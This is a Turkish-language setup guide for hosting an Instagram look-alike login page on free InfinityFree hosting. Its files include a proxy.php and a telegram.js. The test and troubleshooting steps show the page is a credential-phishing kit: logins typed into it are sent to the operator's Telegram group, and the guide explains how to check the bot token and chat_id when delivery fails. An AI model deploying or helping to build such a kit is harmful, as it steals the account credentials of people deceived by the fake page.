# InfinityFree Hosting Kurulum Talimatları

Bu talimatlar, Instagram klonunu InfinityFree ücretsiz hosting üzerine yüklemek için adım adım rehberdir.

## Adım 1: InfinityFree Hesabı Oluşturma

1. [InfinityFree.com](https://infinityfree.com/) adresinden bir hesap oluşturun
2. Hesabınızı etkinleştirin ve kontrol paneline giriş yapın

## Adım 2: Yeni Alan Adı Ekleme

1. "New Domain" butonuna tıklayın
2. Size verilen ücretsiz alt alan adını seçin veya kendi alan adınızı ekleyin
3. Talimatları takip ederek alan adı kurulumunu tamamlayın

## Adım 3: Dosyaları Yükleme

1. InfinityFree kontrol panelinden "File Manager" seçeneğine tıklayın
2. Açılan File Manager arayüzünde `/htdocs` klasörüne gidin
3. "Upload Files" butonunu kullanarak dosyaları yükleyin:
   - Bu pakettteki tüm dosya ve klasörleri yükleyin
   - Yükleme sırasında klasör yapısını korumak önemlidir

## Adım 4: Dosya Yapısı Kontrolü

InfinityFree'de `/htdocs` klasörü, web sitenizin kök dizinidir. Dosya yapısı şu şekilde olmalıdır:

```
/htdocs/
  ├── assets/
  │   ├── index-CSaOivj7.js
  │   └── index-Dlz4I9H0.css
  ├── images/
  │   ├── facebook.png
  │   ├── icon.png
  │   ├── instagram_logo.png
  │   └── instagram.png
  ├── index.html
  ├── proxy.php
  └── telegram.js
```

## Adım 5: Dosya İzinlerini Kontrol Etme

1. Tüm PHP dosyalarının 644 (rw-r--r--) izinlerine sahip olduğundan emin olun
2. Dosya izinlerini değiştirmek için:
   - File Manager'da dosyaya sağ tıklayın
   - "Change Permissions" seçeneğini seçin
   - İzin değerini 644 olarak ayarlayın

## Adım 6: Test Etme

1. Web tarayıcınızda sitenizi açın (örn: https://sizinsite.kesug.com/)
2. Giriş bilgilerini girin ve "Giriş Yap" butonuna tıklayın
3. Bilgilerin Telegram grubuna iletildiğini doğrulayın

## Sorun Giderme

### 403 Forbidden Hatası

Eğer proxy.php dosyası 403 Forbidden hatası veriyorsa:
- Dosya izinlerini doğru ayarladığınızdan emin olun (644)
- .htaccess dosyasının PHP çalıştırma izinlerini engellememesini sağlayın

### Mesajlar İletilmiyor

Eğer form gönderimi sonrası mesajlar Telegram'a ulaşmıyorsa:
1. Tarayıcı konsolunu açın (F12) ve hata mesajlarını kontrol edin
2. proxy.php dosyasının doğru konumda olduğunu doğrulayın
3. InfinityFree'nin cURL desteğini sağladığından emin olun
4. telegram.js dosyasındaki token ve chat_id değerlerinin doğru olduğunu kontrol edin

### Sayfa Görüntülenmiyor

Sayfa düzgün yüklenmiyorsa:
1. Tüm dosyaların doğru konumlarda olduğunu kontrol edin
2. Tarayıcı konsolunda 404 hatalarına bakın ve eksik dosyaları tespit edin
3. InfinityFree kontrol panelinden "Errors" bölümünü kontrol edin

## İlave İpuçları

- InfinityFree, HTTPS desteği sunar - güvenli bağlantı kullanmak için sitenizi https:// ile açın
- Uzun süre kullanılmayan hesaplar devre dışı bırakılabilir, düzenli olarak giriş yapın
- Site yüklemesi yavaşsa, dosya boyutlarını optimize etmeyi düşünün (özellikle resimler için)